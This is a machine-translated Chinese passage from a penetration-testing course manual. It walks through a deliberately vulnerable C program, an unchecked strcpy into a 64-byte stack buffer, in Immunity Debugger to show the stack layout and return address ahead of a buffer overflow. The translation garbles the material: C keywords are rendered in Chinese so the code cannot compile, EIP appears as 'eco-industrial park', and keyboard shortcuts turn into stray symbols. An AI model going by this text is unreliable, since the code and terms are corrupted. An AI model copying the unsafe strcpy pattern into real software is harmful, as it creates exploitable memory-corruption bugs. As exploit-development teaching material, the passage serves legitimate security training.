<div style="position:absolute;top:44331;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令，分别有</font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&amp;</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* 的</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">快捷键</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">两者的区别在于</font></font></nobr></div>
<div style="position:absolute;top:44351;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">步骤为</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将遵循执行流进入一个给定的函数调用，同时</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">单步通过</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将执行</font></font></nobr></div>
<div style="position:absolute;top:44370;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">整个函数并从中返回。</font></font></nobr></div>
<div style="position:absolute;top:44403;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于这种情况下的入口点与</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">main</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数</font><font style="vertical-align: inherit;">的开头不重合</font><font style="vertical-align: inherit;">，我们的第一个</font></font></nobr></div>
<div style="position:absolute;top:44422;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标是找到</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">main</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数在内存中的位置。</font><font style="vertical-align: inherit;">在这个特定的应用程序中，我们可以</font></font></nobr></div>
<div style="position:absolute;top:44441;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在进程内存空间中搜索下面突出显示的错误消息，以帮助我们获得</font></font></nobr></div>
<div style="position:absolute;top:44461;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">轴承：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:44496;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#include &lt;stdio.h&gt;</font></font></nobr></div>
<div style="position:absolute;top:44513;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#include &lt;string.h&gt;</font></font></nobr></div>
<div style="position:absolute;top:44546;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">int main(int argc, char *argv[])</font></font></nobr></div>
<div style="position:absolute;top:44563;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:44581;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字符缓冲区[64]；</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:44614;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果 (argc &lt; 2)</font></font></nobr></div>
<div style="position:absolute;top:44631;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:44648;left:166"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">printf("错误 - 您必须至少提供一个参数\n");</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:44682;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回 1；</font></font></nobr></div>
<div style="position:absolute;top:44699;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:44733;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcpy（缓冲区，argv[1]）；</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:44767;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回0；</font></font></nobr></div>
<div style="position:absolute;top:44784;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
<div style="position:absolute;top:44804;left:257"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 340 - 错误信息可以帮助我们定位 main 函数</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:44833;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要搜索，我们在反汇编窗口内右键单击并选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&gt;</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所有引用的文本</font></font></i></nobr></div>
<div style="position:absolute;top:44852;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字符串</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:45319;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="39"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 39 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:45352;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:46429;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:46429;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:46429;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">359</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:46249;left:300"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 190：在 Immunity Debugger 中搜索字符串</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:46280;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结果窗口（图 191）清楚地显示了我们正在寻找的字符串。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:46507;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="40"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 40 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:46540;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:47617;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:47617;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:47617;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">360</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:46876;left:187"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 191：找到我们的错误信息，我们可以回溯主函数的位置</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:46907;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">双击该行，我们返回到反汇编窗口，但这次在</font><i><font style="vertical-align: inherit;">主</font></i><font style="vertical-align: inherit;">窗口中</font></font><i><font style="vertical-align: inherit;"></font></i></nobr></div>
<div style="position:absolute;top:46926;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">功能。</font><font style="vertical-align: inherit;">在图 192 中，我们也识别出显示错误消息字符串的指令</font></font></nobr></div>
<div style="position:absolute;top:46945;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为对</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcpy</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数</font><font style="vertical-align: inherit;">的调用</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:47254;left:285"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图192：主函数已成功定位</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:47285;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的兴趣在于</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcpy</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数调用本身，因此我们可以</font><font style="vertical-align: inherit;">在这条指令上</font><font style="vertical-align: inherit;">放置一个</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">断点</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">307</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:47304;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">断点本质上是一种有意的暂停，可以由调试器在任何程序上设置</font></font></nobr></div>
<div style="position:absolute;top:47324;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作说明。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:47567;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">307 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Breakpoint</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:47695;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="41"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 41 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:47728;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:48805;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:48805;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:48805;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">361</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:48143;left:274"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 193：在调用 strcpy 函数时设置断点</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:48174;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcpy</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数调用</font><font style="vertical-align: inherit;">上设置断点</font><font style="vertical-align: inherit;">，我们在反汇编窗口中选择行</font></font></nobr></div>
<div style="position:absolute;top:48194;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">地址 0x004015AA 并按</font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">@</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">一旦设置，断点将显示带有</font></font></nobr></div>
<div style="position:absolute;top:48213;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">淡蓝色突出显示，如图 193 所示。</font></font></nobr></div>
<div style="position:absolute;top:48246;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们可以通过选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Debug</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> &gt; </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Run</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或按</font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。几乎</font></font></nobr></div>
<div style="position:absolute;top:48265;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">立即，执行在调用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcpy</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数</font><font style="vertical-align: inherit;">之前再次停止</font><font style="vertical-align: inherit;">，我们在其中设置了我们的</font></font></nobr></div>
<div style="position:absolute;top:48284;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">断点（地址 0x004015AA）。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:48668;left:378"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 194：执行 strcpy</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:48699;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如图 194 所示，执行已在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcpy</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令（地址 0x004015AA）</font><font style="vertical-align: inherit;">处暂停</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">生态工业园区</font></font></nobr></div>
<div style="position:absolute;top:48718;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">也设置为此地址，因为它指向要执行的下一条指令。</font><font style="vertical-align: inherit;">在堆栈中</font></font></nobr></div>
<div style="position:absolute;top:48737;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">窗口，我们从命令行输入中找到十二个“A”字符（</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">src = “AAAAAAAAAAAA”</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:48883;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="42"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 42 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:48916;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:49993;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:49993;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:49993;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">362</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:49012;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以及将复制这些字符的 64 字节缓冲区变量的地址（</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dest =</font></font></i></nobr></div>
<div style="position:absolute;top:49031;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0065FE70</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）。</font></font></nobr></div>
<div style="position:absolute;top:49064;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们现在可以进入</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcpy</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">调用（使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Debug</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> &gt; </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Step into</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或</font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&amp;</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）。</font><font style="vertical-align: inherit;">请注意，</font></font></nobr></div>
<div style="position:absolute;top:49083;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">左上角的汇编指令窗口发生了变化，因为我们现在在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcpy 中</font></font></i></nobr></div>
<div style="position:absolute;top:49103;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">功能。</font><font style="vertical-align: inherit;">图 195 中突出显示的地址 (0x76485E90) 说明了这一点：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:49353;left:321"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 195：strcpy 执行前的堆栈布局</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:49384;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在，我们可以双击</font><font style="vertical-align: inherit;">堆栈窗格中</font><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcpy</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标地址（0x0065FE70）来</font></font></nobr></div>
<div style="position:absolute;top:49403;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更好地监控发生在该地址的内存写操作。</font><font style="vertical-align: inherit;">此地址已突出显示</font></font></nobr></div>
<div style="position:absolute;top:49423;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在图 196 中，如红色箭头所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:49640;left:310"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 196：监控内存写操作</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:49671;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如图 197 所示，这会稍微改变堆栈窗格的视图。</font><font style="vertical-align: inherit;">现在，我们看到相对</font></font></nobr></div>
<div style="position:absolute;top:49690;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（正和负）左列中的偏移量而不是实际地址： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:50071;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="43"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 43 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:50104;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:51181;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:51181;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:51181;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">363</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:50621;left:263"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 197：执行 strcpy 之前具有相对偏移量的堆栈布局</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:50652;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们仔细看看这个堆栈窗口。</font><font style="vertical-align: inherit;">首先，注意偏移零，现在突出显示并注明</font></font></nobr></div>
<div style="position:absolute;top:50671;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">带有箭头指示符 (==&gt;)，地址为 0x0065FE70。</font><font style="vertical-align: inherit;">这是目标缓冲区的开始</font></font></nobr></div>
<div style="position:absolute;top:50691;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的输入字符串 A 最终将被复制。</font><font style="vertical-align: inherit;">因为我们定义了一个 64 字节的缓冲区</font></font></nobr></div>
<div style="position:absolute;top:50710;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">程序 (buffer[64])，我们的缓冲区从偏移量 0 扩展到偏移量 +40，包括空终止符</font></font></nobr></div>
<div style="position:absolute;top:50729;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于我们的字符数组。</font></font></nobr></div>
<div style="position:absolute;top:50762;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，此缓冲区中似乎有返回地址（偏移量 +C、+1C 和 +2C）</font></font></nobr></div>
<div style="position:absolute;top:50782;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以及其他各种奇怪的东西。</font><font style="vertical-align: inherit;">由于我们在定义缓冲区时没有初始化或清除缓冲区，</font></font></nobr></div>
<div style="position:absolute;top:50801;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该空间充满了调试器试图解释的剩余数据。</font><font style="vertical-align: inherit;">当时间</font></font></nobr></div>
<div style="position:absolute;top:50820;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来将我们的 A 数组复制到缓冲区，此剩余数据将被覆盖。</font></font></nobr></div>
<div style="position:absolute;top:50853;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，注意堆栈顶部的返回地址 0x004015AF。</font><font style="vertical-align: inherit;">这是我们要的地址</font></font></nobr></div>
<div style="position:absolute;top:50872;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcpy</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完成并与</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MOV EAX,0</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指令</font><font style="vertical-align: inherit;">相关</font><font style="vertical-align: inherit;">时返回到</font></font></nobr></div>
<div style="position:absolute;top:50892;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 194. 这是紧跟在</font><i><font style="vertical-align: inherit;">CALL &lt;JMP.&amp;msvcrt.strcpy&gt;</font></i><font style="vertical-align: inherit;">之后的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指令</font></font></i></nobr></div>
<div style="position:absolute;top:50911;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">把我们带到这里的指令，以及那个 CALL 指令把这个地址压入堆栈</font></font></nobr></div>
<div style="position:absolute;top:50931;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自动为我们。</font></font></nobr></div>
<div style="position:absolute;top:50963;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此时，我们可以</font><font style="vertical-align: inherit;">用</font><i><font style="vertical-align: inherit;">Debug</font></i><font style="vertical-align: inherit;"> &gt;</font><font style="vertical-align: inherit;">让执行继续到</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcpy</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数</font><font style="vertical-align: inherit;">的末尾</font></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:50983;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行直到返回</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或</font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> + </font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。这将允许我们看到</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcpy</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数</font><font style="vertical-align: inherit;">的结果</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:51259;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="44"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 44 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:51292;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:52369;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:52369;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:52369;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">364</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:51737;left:268"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 198：执行 strcpy 后具有相对偏移量的堆栈布局</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:51768;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在图 198 中，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcpy</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已将 12 个“A”字符复制到堆栈（到缓冲区中），我们是</font></font></nobr></div>
<div style="position:absolute;top:51787;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显然在由声明的本地</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量大小</font><font style="vertical-align: inherit;">强加的 64 字节缓冲区限制内</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">前</font></font></nobr></div>
<div style="position:absolute;top:51807;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">继续，记下位于偏移量 0x4C 处的地址 (004013E3)（图 198）</font></font></nobr></div>
<div style="position:absolute;top:51826;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来自</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量。</font><font style="vertical-align: inherit;">这是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">main</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数的返回地址，我们的指令地址</font></font></nobr></div>
<div style="position:absolute;top:51845;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数完成执行，</font><font style="vertical-align: inherit;">将返回</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">我们将在</font></font></nobr></div>
